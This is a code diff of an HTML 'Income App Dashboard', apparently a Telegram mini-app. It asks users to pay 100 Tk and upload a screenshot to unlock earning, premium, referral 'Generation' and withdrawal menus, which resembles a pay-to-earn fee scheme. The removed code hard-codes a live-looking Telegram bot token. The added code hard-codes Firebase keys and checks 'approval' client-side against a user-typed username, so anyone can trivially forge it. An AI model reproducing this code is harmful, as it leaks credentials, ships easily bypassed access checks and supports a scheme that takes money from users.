@@ -3,152 +3,82 @@
 <head>
 <title>Income App Dashboard</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+
 <style>
 body {font-family: Arial; background:#0f172a; color:white; text-align:center;}
 button {padding:15px; margin:10px; width:80%; border:none; border-radius:10px; font-size:18px; background:#22c55e; color:white;}
 input {margin:10px; padding:10px; width:80%;}
 .menu-section {margin-top:30px; border-top:1px solid #555; padding-top:20px;}
 .disabled {opacity:0.5; pointer-events:none;}
+.box{background:#1e293b;padding:20px;border-radius:12px;max-width:400px;margin:auto;}
 </style>
 </head>
+
 <body>
 
 <h2>💰 Income App Dashboard</h2>
 
-‎<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Account Verify</title>
-<style>
-body{font-family:sans-serif;background:#0f172a;color:#fff;text-align:center;padding:20px;}
-.box{background:#1e293b;padding:20px;border-radius:12px;max-width:400px;margin:auto;}
-input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:none;}
-button{background:#22c55e;color:#000;font-weight:bold;}
-</style>
-</head>
-<body>
-
-<div class="box">
+<!-- ✅ ACCOUNT VERIFY -->
+<div id="account-verify" class="box">
 <h2>Account Verify — 100 Tk</h2>
 <p>Send money → Upload Screenshot</p>
+
 <input id="name" placeholder="Your Name">
 <input type="file" id="file">
+
 <button onclick="sendScreenshot()">Submit Screenshot</button>
 <p id="status"></p>
 </div>
 
-<script>
-const BOT_TOKEN = "8051092032:AAGSVOe8efxnJqnBhsM2wdOclA-qtf45V98";
-const ADMIN_ID = "7832485327";
-const BOT_USERNAME = "@Easyearnverify_bot";
-
-async function sendScreenshot(){
-
-  const name = document.getElementById("name").value;
-  const file = document.getElementById("file").files[0];
-
-  if(!file){ alert("Upload screenshot"); return; }
-
-  const tg = window.Telegram.WebApp;
-  const userId = tg?.initDataUnsafe?.user?.id || "unknown";
-
-  const formData = new FormData();
-  formData.append("chat_id", ADMIN_ID);
-  formData.append("photo", file);
-  formData.append("caption",
-`💰 New Verify Request
-
-👤 Name: ${name}
-🆔 User ID: ${userId}
-
-Approve or Reject:`);
-
-  formData.append("reply_markup", JSON.stringify({
-    inline_keyboard: [
-      [
-        {text:"✅ Approve", url:`https://t.me/${BOT_USERNAME}?start=approve_${userId}`},
-        {text:"❌ Reject", url:`https://t.me/${BOT_USERNAME}?start=reject_${userId}`}
-      ]
-    ]
-  }));
-
-  try{
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-      method:"POST",
-      body:formData
-    });
-    if(res.ok){
-      document.getElementById('status').innerText='✅ Submitted — Waiting for approval';
-      alert("Screenshot Submitted Successfully!");
-    }else{
-      alert("❌ Failed to send. Try again.");
-    }
-  }catch(err){
-    console.error(err);
-    alert("❌ Error occurred. Try again.");
-  }
-}
-</script>
-
-</body>
-</html>
-‎
-
-<!-- Menu -->
+<!-- ✅ MENU -->
 <div id="menu">
 <div class="menu-section">
-<button id="jobsBtn" class="disabled">📋 My Jobs & Proved</button>
-<button id="premiumBtn" class="disabled">💎 Premium Package</button>
-<button id="generationBtn" class="disabled">🌳 Generation</button>
-<button id="walletBtn" class="disabled">💰 My Wallet</button>
-<button id="withdrawBtn" class="disabled">🏧 Withdraw</button>
-<button id="transferBtn" class="disabled">🔁 Transfer Balance</button>
-<
-<button id="supportBtn">📞 Support</button>
+
+<button class="disabled">📋 My Jobs & Proved</button>
+<button class="disabled">💎 Premium Package</button>
+<button class="disabled">🌳 Generation</button>
+<button class="disabled">💰 My Wallet</button>
+<button class="disabled">🏧 Withdraw</button>
+<button class="disabled">🔁 Transfer Balance</button>
+<button>📞 Support</button>
+
 </div>
 </div>
 
+
+<!-- 🔥 Firebase CDN -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
 <script>
-// 🔹 Firebase Config
+
+// 🔥 তোমার Firebase Config
 const firebaseConfig = {
-  apiKey: "YOUR_API_KEY",
-  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-  projectId: "YOUR_PROJECT_ID",
-  storageBucket: "YOUR_PROJECT_ID.appspot.com",
-  messagingSenderId: "SENDER_ID",
-  appId: "APP_ID"
+  apiKey: "AIzaSyAIgnpl1kL7JsnBsxUD_8QM-OrnHA4JaAA",
+  authDomain: "miniapp-f641f.firebaseapp.com",
+  projectId: "miniapp-f641f",
+  storageBucket: "miniapp-f641f.firebasestorage.app",
+  messagingSenderId: "650123816960",
+  appId: "1:650123816960:web:dec31803b3cb73a0ba68e5"
 };
 
 firebase.initializeApp(firebaseConfig);
+
 const storage = firebase.storage();
 const db = firebase.firestore();
 
+
 // 🔹 Telegram Username Input
-let telegramUsername = prompt("Enter your Telegram username (e.g., @username)");
+let telegramUsername = prompt("Enter your Telegram username");
 
-// 🔹 Check Account Status
-db.collection('users').doc(telegramUsername).get().then(doc => {
-  if(doc.exists && doc.data().accountStatus === "approved"){
-    enableMenu();
-  }
-});
 
-// 🔹 Enable Menu Function
-function enableMenu(){
-  const buttons = document.querySelectorAll("#menu button");
-  buttons.forEach(btn => btn.classList.remove("disabled"));
-  document.getElementById("account-verify").style.display = "none";
-}
+// 🔹 Upload Screenshot
+function sendScreenshot(){
 
-// 🔹 Upload Screenshot Function
-function uploadScreenshot(){
-  const file = document.getElementById('screenshotInput').files[0];
-  if(!file){ alert('Please select screenshot'); return; }
+  const file = document.getElementById("file").files[0];
+
+  if(!file){ alert("Upload screenshot"); return; }
 
   const uploadTask = storage.ref('payments/' + telegramUsername + '_' + file.name).put(file);
 
@@ -157,17 +87,41 @@ function uploadScreenshot(){
     error => { console.error(error); },
     () => {
       uploadTask.snapshot.ref.getDownloadURL().then(url => {
+
         db.collection('users').doc(telegramUsername).set({
           screenshotURL: url,
           accountStatus: "pending",
           timestamp: firebase.firestore.FieldValue.serverTimestamp()
         }).then(() => {
-          document.getElementById('status').innerText = 'Screenshot uploaded! Waiting for approval.';
+
+          document.getElementById('status').innerText =
+          '✅ Submitted — Waiting for approval';
+
         });
+
       });
     }
   );
 }
+
+
+// 🔹 Check Account Status
+db.collection('users').doc(telegramUsername).get().then(doc => {
+  if(doc.exists && doc.data().accountStatus === "approved"){
+    enableMenu();
+  }
+});
+
+
+// 🔹 Enable Menu
+function enableMenu(){
+  document.getElementById("account-verify").style.display = "none";
+
+  const buttons = document.querySelectorAll("#menu button");
+  buttons.forEach(btn => btn.classList.remove("disabled"));
+}
+
 </script>
+
 </body>
 </html>
